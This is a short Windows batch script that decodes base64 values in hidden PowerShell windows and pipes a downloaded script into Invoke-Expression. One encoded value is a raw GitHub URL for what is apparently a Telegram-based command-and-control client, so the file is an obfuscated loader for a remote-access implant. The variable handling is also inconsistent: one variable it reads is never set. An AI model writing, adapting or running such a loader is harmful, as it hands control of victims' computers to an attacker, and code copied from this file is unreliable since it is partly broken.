@echo off
setlocal
set "m85X7vG5y=BASE64_ENCODED_TOKEN_HERE"
set "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlaWdld29ybS9Qb3NoR3JhbS1DMi9tYWluL1RlbGVncmFtLUMyLUNsaWVudC5wczE="
for /f %%i in ('powershell.exe -NonI -NoP -W H -C "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%m85X7vG5y%'))"') do set "hR9JH5iy=%%i"
for /f %%i in ('powershell.exe -NonI -NoP -W H -C "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%J56hm9wI%'))"') do set "P6y5br2a=%%i"
powershell.exe -NonI -NoP -W H -C "$tg='%hR9JH5iy%'; irm '%P6y5br2a%' | iex"
endlocal